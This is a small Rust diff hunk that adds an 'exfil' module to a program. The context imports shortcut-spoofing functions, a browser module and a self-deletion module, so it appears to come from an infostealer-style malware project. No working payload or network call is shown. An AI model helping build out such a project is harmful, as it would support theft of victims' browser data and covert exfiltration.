@@ -10,6 +10,8 @@ use shortcut::{spoof_lnk, restore_lnk};
 mod browser;
 use selfdeletion;
 
+mod exfil;
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(feature = "debug")]
